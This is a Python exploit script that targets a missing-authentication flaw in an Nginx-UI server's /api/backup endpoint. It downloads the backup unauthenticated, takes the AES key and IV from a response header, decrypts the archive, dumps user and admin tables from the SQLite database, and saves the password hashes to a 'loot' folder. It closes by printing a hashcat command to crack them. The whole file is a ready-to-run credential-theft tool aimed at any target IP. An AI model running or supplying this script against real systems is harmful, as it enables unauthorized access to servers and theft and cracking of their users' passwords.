#!/usr/bin/env python3
"""
Backup Archive Exfiltration Tool
Target: Web Management Server (Nginx-UI) Backup API

This script exploits a missing authentication vulnerability (CWE-862)
on the /api/backup endpoint. The backup archive is AES-256-CBC
encrypted with a key and IV embedded in the X-Backup-Security
response header.

Usage:
    python3 backup_extractor.py <TARGET> [<OUTPUT_DIR>]

Examples:
    python3 backup_extractor.py 10.0.0.1
    python3 backup_extractor.py 10.0.0.1 ./loot
"""

import requests
import base64
import hashlib
import os
import sys
import subprocess
import tempfile
import zipfile
import sqlite3
import json
from urllib.parse import urlparse


def fetch_backup(target: str) -> bytes:
    """
    Download the encrypted backup archive from the target.
    Returns the raw response content.
    """
    url = f"http://{target}/api/backup"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    print(f"[*] Fetching backup from {url} ...")
    r = requests.get(url, headers=headers, timeout=30)
    r.raise_for_status()
    print(f"[+] Backup downloaded: {len(r.content)} bytes")
    print(f"[+] Response headers:")
    for k, v in r.headers.items():
        print(f"    {k}: {v}")
    return r.content


def parse_security_header(header_value: str) -> tuple:
    """
    Parse X-Backup-Security header to extract key and IV.
    Format: <BASE64_KEY>:<BASE64_IV>
    Returns (key_bytes, iv_bytes).
    """
    parts = header_value.strip().split(":")
    if len(parts) != 2:
        raise ValueError(f"Unexpected header format: {header_value}")
    
    key_b64, iv_b64 = parts
    
    # Ensure proper base64 padding
    key_b64 += "=" * (4 - len(key_b64) % 4) if len(key_b64) % 4 else ""
    iv_b64 += "=" * (4 - len(iv_b64) % 4) if len(iv_b64) % 4 else ""
    
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    
    print(f"[*] Key ({len(key)} bytes): {key.hex()}")
    print(f"[*] IV  ({len(iv)} bytes): {iv.hex()}")
    return key, iv


def decrypt_backup(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    """
    Decrypt the backup archive using AES-256-CBC via OpenSSL.
    Returns decrypted zip data.
    """
    print("[*] Decrypting backup with AES-256-CBC ...")
    
    # Write encrypted data to temp file
    fd, enc_path = tempfile.mkstemp(suffix=".enc")
    os.write(fd, encrypted_data)
    os.close(fd)
    
    out_path = enc_path + ".zip"
    
    try:
        cmd = [
            "openssl", "enc", "-d",
            "-aes-256-cbc",
            "-K", key.hex().upper(),
            "-iv", iv.hex().upper(),
            "-in", enc_path,
            "-out", out_path,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"[-] OpenSSL error: {result.stderr}")
            # Try with -pbkdf2 or different OpenSSL version
            cmd.append("-pbkdf2")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode != 0:
                raise RuntimeError(f"Decryption failed: {result.stderr}")
        
        with open(out_path, "rb") as f:
            decrypted = f.read()
        print(f"[+] Decrypted: {len(decrypted)} bytes")
        return decrypted
    finally:
        os.unlink(enc_path)
        if os.path.exists(out_path):
            os.unlink(out_path)


def extract_database(decrypted_zip: bytes, output_dir: str) -> str:
    """
    Extract database.db from the decrypted zip archive.
    Returns path to extracted database file.
    """
    print("[*] Extracting database from zip archive ...")
    
    zip_path = os.path.join(output_dir, "backup.zip")
    with open(zip_path, "wb") as f:
        f.write(decrypted_zip)
    
    db_path = None
    
    with zipfile.ZipFile(zip_path, "r") as zf:
        file_list = zf.namelist()
        print(f"[*] Archive contents: {file_list}")
        
        for name in file_list:
            if "database" in name.lower() or name.endswith(".db"):
                db_path = os.path.join(output_dir, os.path.basename(name))
                with open(db_path, "wb") as f:
                    f.write(zf.read(name))
                print(f"[+] Extracted: {name} -> {db_path}")
                break
    
    if not db_path:
        # Try extracting all files
        print("[*] No database file found, extracting all entries ...")
        zf.extractall(output_dir)
        for root, dirs, files in os.walk(output_dir):
            for f in files:
                if f.endswith(".db"):
                    db_path = os.path.join(root, f)
                    print(f"[+] Found database: {db_path}")
                    break
    
    return db_path


def dump_users(db_path: str) -> list:
    """
    Query user accounts and password hashes from the database.
    Returns list of dicts with user info.
    """
    print(f"[*] Querying user table from {db_path} ...")
    
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Get table list
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = [row[0] for row in cursor.fetchall()]
    print(f"[*] Tables: {tables}")
    
    users = []
    
    for table in tables:
        cursor.execute(f"PRAGMA table_info('{table}');")
        columns = [row[1] for row in cursor.fetchall()]
        
        # Look for user/auth tables
        if any(kw in table.lower() for kw in ["user", "auth", "admin", "account"]):
            print(f"[*] Inspecting table: {table} (columns: {columns})")
            cursor.execute(f"SELECT * FROM '{table}';")
            rows = cursor.fetchall()
            
            for row in rows:
                entry = dict(zip(columns, row))
                users.append(entry)
                print(f"    {entry}")
    
    conn.close()
    return users


def save_hash_file(users: list, output_path: str):
    """
    Save password hashes in hashcat-compatible format.
    """
    print(f"[*] Saving hashes to {output_path} ...")
    
    with open(output_path, "w") as f:
        for user in users:
            for key in user:
                val = str(user[key])
                if val.startswith("$2") or val.startswith("$6"):
                    username = user.get("username", user.get("name", "unknown"))
                    f.write(f"{username}:{val}\n")
                    print(f"    {username}:{val[:30]}...")
    
    print(f"[+] Saved {output_path}")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    target = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else "loot"
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"[*] Target: {target}")
    print(f"[*] Output: {output_dir}")
    print()
    
    # Step 1: Fetch the encrypted backup
    backup_data = fetch_backup(target)
    
    print()
    
    # Step 2: Extract key and IV from response (need to use requests session)
    url = f"http://{target}/api/backup"
    r = requests.get(url, timeout=30)
    sec_header = r.headers.get("X-Backup-Security", "")
    if not sec_header:
        print("[-] No X-Backup-Security header found!")
        print("[*] Header present in response:")
        for k, v in r.headers.items():
            print(f"    {k}: {v}")
        sys.exit(1)
    
    key, iv = parse_security_header(sec_header)
    
    print()
    
    # Step 3: Decrypt the backup
    decrypted = decrypt_backup(backup_data, key, iv)
    
    print()
    
    # Step 4: Extract database
    db_path = extract_database(decrypted, output_dir)
    
    if not db_path:
        print("[-] No database file found in backup archive")
        sys.exit(1)
    
    print()
    
    # Step 5: Dump users and hashes
    users = dump_users(db_path)
    
    print()
    
    # Step 6: Save hash file
    hash_path = os.path.join(output_dir, "hashes.txt")
    save_hash_file(users, hash_path)
    
    print()
    print("[+] Extraction complete!")
    print(f"[*] Database: {db_path}")
    print(f"[*] Hashes:   {hash_path}")
    print(f"[*] To crack: hashcat -m 3200 -a 0 {hash_path} /usr/share/wordlists/rockyou.txt --force")


if __name__ == "__main__":
    main()
